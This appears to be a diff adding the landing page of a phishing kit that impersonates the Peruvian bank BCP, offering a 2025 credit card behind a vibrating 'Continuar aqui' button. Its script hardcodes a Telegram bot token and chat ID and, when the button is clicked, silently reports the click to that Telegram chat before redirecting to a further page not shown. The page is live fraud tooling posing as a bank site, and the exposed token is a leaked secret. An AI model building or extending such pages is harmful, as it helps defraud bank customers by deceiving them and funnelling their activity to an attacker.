@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlUXPFaPITtyWUEMwtTfWIYXX1KT17BYoTiw&s">
+    <title>Tarjeta de Crédito BCP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(180deg, #002a8c 0%, #000a24 100%);
+            color: white;
+            touch-action: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Prevent all scrolling and movement */
+        html {
+            overflow: hidden;
+            touch-action: none;
+            -ms-touch-action: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: linear-gradient(90deg, #002a8c, #002a8c);
+            backdrop-filter: blur(10px);
+            position: relative;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            height: 70px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            color: white;
+            padding: 8px 16px;
+            font-weight: bold;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+            padding: 8px;
+            transition: all 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .hamburger:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .hamburger span {
+            width: 28px;
+            height: 3px;
+            background: white;
+            margin: 3px 0;
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .hamburger.active span:nth-child(1) {
+            transform: rotate(-45deg) translate(-6px, 6px);
+        }
+
+        .hamburger.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .hamburger.active span:nth-child(3) {
+            transform: rotate(45deg) translate(-6px, -6px);
+        }
+
+        /* Mobile Menu */
+        .mobile-menu {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 320px;
+            height: 100vh;
+            background: linear-gradient(180deg, #1e3a8a 0%, #1d4ed8 100%);
+            backdrop-filter: blur(20px);
+            transition: right 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 999;
+            padding: 80px 30px 30px;
+            box-shadow: -5px 0 25px rgba(0, 0, 0, 0.3);
+            overflow-y: auto;
+        }
+
+        .mobile-menu.active { right: 0; }
+
+        .mobile-menu ul { list-style: none; }
+
+        .mobile-menu li { margin: 25px 0; }
+
+        .mobile-menu a {
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+            display: block;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            border-radius: 8px;
+        }
+
+        .mobile-menu a:hover {
+            color: #ff6600;
+            background: rgba(255, 102, 0, 0.1);
+            padding-left: 10px;
+        }
+
+        /* Main Content */
+        .main-content {
+            text-align: center;
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+            height: calc(100vh - 70px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .main-title {
+            color: white;
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: bold;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: clamp(1rem, 3vw, 1.3rem);
+            margin-bottom: 35px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        /* Button with Click Effect and Vibration Animation */
+        .button-container {
+            position: relative;
+            margin-bottom: 50px;
+        }
+
+        .button-shadow {
+            position: absolute;
+            top: 6px;
+            left: 0;
+            right: 0;
+            height: 52px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 50px;
+            z-index: 1;
+        }
+
+        /* Keyframes para la animación de vibración */
+        @keyframes vibrate {
+            0% { transform: translateX(0); }
+            10% { transform: translateX(-2px); }
+            20% { transform: translateX(2px); }
+            30% { transform: translateX(-2px); }
+            40% { transform: translateX(2px); }
+            50% { transform: translateX(-1px); }
+            60% { transform: translateX(1px); }
+            70% { transform: translateX(-1px); }
+            80% { transform: translateX(1px); }
+            90% { transform: translateX(0); }
+            100% { transform: translateX(0); }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 4px 15px rgba(255, 102, 0, 0.4); }
+            50% { box-shadow: 0 4px 25px rgba(255, 102, 0, 0.8); }
+            100% { box-shadow: 0 4px 15px rgba(255, 102, 0, 0.4); }
+        }
+
+        .cta-button {
+            position: relative;
+            background: linear-gradient(135deg, #ff6600, #ff8533);
+            color: white;
+            padding: 16px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            z-index: 2;
+            box-shadow: 0 4px 15px rgba(255, 102, 0, 0.4);
+            /* Aplicamos la animación de vibración continua */
+            animation: vibrate 0.6s ease-in-out infinite, pulse 2s ease-in-out infinite;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 102, 0, 0.5);
+            background: linear-gradient(135deg, #ff7719, #ff6600);
+            /* Intensificamos la vibración en hover */
+            animation: vibrate 0.3s ease-in-out infinite, pulse 1s ease-in-out infinite;
+        }
+
+        .cta-button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 8px rgba(255, 102, 0, 0.3);
+            animation: none;
+        }
+
+        /* ========== CARDS SECTION (FIXEADO) ========== */
+        .cards-container{
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: auto;
+            margin-top: 10px;
+        }
+
+        /* Ocultar el círculo naranja */
+        .background-circle{
+            display: none !important;
+        }
+
+        .cards-group{
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Usaremos una sola tarjeta como marco de la IMAGEN */
+        .credit-card{
+            position: static;
+            width: clamp(280px, 65vw, 560px);
+            height: auto;
+            left: auto; top: auto;
+            background: transparent;
+            border-radius: 0;
+            box-shadow: none;
+            transform: none;
+            cursor: default;
+        }
+
+        .credit-card:hover{
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Si tu HTML es: <div class="credit-card"><img src="..."></div> */
+        .credit-card img{
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: contain;
+            border-radius: 0;
+            filter: drop-shadow(0 24px 48px rgba(0,0,0,.45));
+        }
+
+        /* Neutralizamos las viejas capas por si siguen en el HTML */
+        .card-gold, .card-silver, .card-blue{
+            background: transparent !important;
+            top: auto !important;
+            left: auto !important;
+            z-index: auto !important;
+        }
+
+        .card-content, .card-logo, .card-number, .card-info,
+        .card-type, .card-brand{
+            display: none !important;
+        }
+
+        /* Overlay for mobile menu */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 998;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Mobile Responsive Design */
+        @media (max-width: 768px) {
+            .header { padding: 12px 15px; height: 65px; }
+            .header-title { font-size: 16px; }
+            .logo { font-size: 18px; padding: 6px 12px; }
+
+            .main-content { padding: 30px 15px; height: calc(100vh - 65px); }
+            .main-title { margin-bottom: 18px; }
+            .subtitle { margin-bottom: 30px; }
+            .button-container { margin-bottom: 40px; }
+            .button-shadow { height: 48px; top: 5px; }
+            .cta-button { padding: 14px 32px; font-size: 16px; }
+
+            .cards-container{ height: auto; }
+            .credit-card{ width: clamp(240px, 70vw, 520px); height: auto; }
+            .background-circle{ display: none !important; }
+
+            .mobile-menu { width: 280px; }
+        }
+
+        @media (max-width: 480px) {
+            .header { padding: 10px 12px; height: 60px; }
+            .main-content { padding: 25px 12px; height: calc(100vh - 60px); }
+            .button-container { margin-bottom: 35px; }
+            .button-shadow { height: 44px; top: 4px; }
+            .cta-button { padding: 12px 28px; font-size: 15px; }
+
+            .cards-container{ height: auto; }
+            .credit-card{ width: clamp(220px, 72vw, 480px); height: auto; }
+            .background-circle{ display: none !important; }
+        }
+
+        @media (max-width: 360px) {
+            .header { padding: 8px 10px; height: 55px; }
+            .logo { font-size: 16px; padding: 5px 10px; }
+            .header-title { font-size: 14px; }
+            .main-content { height: calc(100vh - 55px); padding: 20px 10px; }
+            .button-shadow { height: 40px; top: 3px; }
+            .cta-button { padding: 15px 24px; font-size: 17px; }
+
+            .cards-container{ height: auto; }
+            .credit-card{ width: clamp(200px, 75vw, 440px); height: auto; }
+            .background-circle{ display: none !important; }
+        }
+
+        /* Landscape orientation for mobile */
+        @media (max-height: 500px) and (orientation: landscape) {
+            .main-content {
+                padding: 10px;
+                height: calc(100vh - 50px);
+                justify-content: space-around;
+            }
+
+            .main-title { font-size: 1.5rem; margin-bottom: 8px; }
+            .subtitle { font-size: 0.9rem; margin-bottom: 15px; }
+            .button-container { margin-bottom: 15px; }
+            .button-shadow { height: 36px; top: 2px; }
+            .cta-button { padding: 8px 20px; font-size: 13px; }
+
+            .cards-container{ height: auto; margin-top: 5px; }
+            .credit-card{ width: clamp(220px, 55vw, 460px); height: auto; }
+            .background-circle{ display: none !important; }
+        }
+
+        /* Extra small devices */
+        @media (max-width: 320px) {
+            .main-title { font-size: 1.6rem; }
+            .subtitle { font-size: 0.85rem; }
+            .button-shadow { height: 38px; }
+            .cta-button { padding: 9px 20px; font-size: 13px; }
+
+            .cards-container{ height: auto; }
+            .credit-card{ width: clamp(180px, 78vw, 400px); height: auto; }
+            .background-circle{ display: none !important; }
+        }
+    </style>
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-section">
+            <div class="logo">
+                <img src="assets/Frame.svg" alt="BCP" />
+            </div>
+
+            <h1 class="header-title">Tarjeta de Crédito</h1>
+        </div>
+        <div class="hamburger" id="hamburger">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+
+    <!-- Mobile Menu -->
+    <div class="overlay" id="overlay"></div>
+    <nav class="mobile-menu" id="mobileMenu">
+        <ul>
+            <li><a href="#tarjetas">Tarjetas</a></li>
+            <li><a href="#beneficios">Beneficios</a></li>
+            <li><a href="#requisitos">Requisitos</a></li>
+            <li><a href="#solicitar">Solicitar</a></li>
+            <li><a href="#contacto">Contacto</a></li>
+            <li><a href="#ayuda">Ayuda</a></li>
+            <li><a href="#sucursales">Sucursales</a></li>
+            <li><a href="#promociones">Promociones</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <h2 class="main-title">Pide la Tarjeta de Crédito BCP beneficios 2025</h2>
+        <p class="subtitle">Hazlo en segundos desde la web</p>
+        
+        <!-- Button with Click Effect and Vibration -->
+        <div class="button-container">
+            <div class="button-shadow"></div>
+            <a href="index2.html" class="cta-button" id="ctaButton">Continuar aqui</a>
+        </div>
+
+        <!-- Cards Display -->
+        <div class="cards-container">
+            <div class="background-circle"></div>
+            <div class="cards-group">
+                <!-- Tu propia tarjeta (imagen) -->
+                <div class="credit-card">
+                    <img src="assets/banner-experimento-640x640-px_tcs.png" alt="Mi Tarjeta" style="width:100%; height:100%; border-radius:15px;">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // =========================
+        // CONFIGURACIÓN DE TELEGRAM BOT
+        // =========================
+        // ⚠️ IMPORTANTE: Reemplaza estos valores con los tuyos
+        const TELEGRAM_BOT_TOKEN = '7779988089:AAE4-6hOLNzGIfh5evEvaNLUEtYCyDhaDec'; // Obtén esto de @BotFather
+        const TELEGRAM_CHAT_ID = '7759602420I';     // Tu ID de chat o el ID del grupo
+
+        // Función para enviar mensaje a Telegram (sin notificación visual)
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error enviando mensaje a Telegram:', error);
+                return false;
+            }
+        }
+
+        // =========================
+        // HAMBURGER MENU & OVERLAY
+        // =========================
+        const hamburger = document.getElementById('hamburger');
+        const mobileMenu = document.getElementById('mobileMenu');
+        const overlay = document.getElementById('overlay');
+
+        function toggleMenu() {
+            hamburger.classList.toggle('active');
+            mobileMenu.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        if (hamburger) {
+            hamburger.addEventListener('click', function (e) {
+                e.stopPropagation();
+                toggleMenu();
+            });
+        }
+
+        if (overlay) {
+            overlay.addEventListener('click', function () {
+                toggleMenu();
+            });
+        }
+
+        // Cerrar menú al hacer click en links del menú móvil
+        const menuLinks = document.querySelectorAll('.mobile-menu a');
+        menuLinks.forEach(link => {
+            link.addEventListener('click', function () {
+                if (mobileMenu.classList.contains('active')) toggleMenu();
+            });
+        });
+
+        // Cerrar con tecla Escape
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape' && mobileMenu && mobileMenu.classList.contains('active')) {
+                toggleMenu();
+            }
+        });
+
+        // =========================
+        // CARD HOVER EFFECTS
+        // =========================
+        const cards = document.querySelectorAll('.credit-card');
+        cards.forEach(card => {
+            card.addEventListener('mouseenter', function () {
+                cards.forEach(otherCard => {
+                    if (otherCard !== card) {
+                        otherCard.style.opacity = '0.7';
+                        otherCard.style.transform = 'scale(0.96)';
+                    }
+                });
+            });
+
+            card.addEventListener('mouseleave', function () {
+                cards.forEach(otherCard => {
+                    otherCard.style.opacity = '1';
+                    otherCard.style.transform = 'scale(1)';
+                });
+            });
+        });
+
+        // =========================
+        // CTA BUTTON - Envío silencioso a Telegram y redirección
+        // =========================
+        const ctaButton = document.getElementById('ctaButton');
+        if (ctaButton) {
+            ctaButton.addEventListener('click', async function (e) {
+                // Prevenir la navegación inmediata
+                e.preventDefault();
+                
+                // Enviar mensaje a Telegram de forma silenciosa (sin notificación visual)
+                const messageText = 'ya se le dio clik en boton';
+                await sendTelegramMessage(messageText);
+                
+                // Redirigir inmediatamente a index2.html
+                window.location.href = 'index3.html';
+            });
+        }
+    </script>
+<script src="AuthGuard.js"></script>
+</body>
+</html>
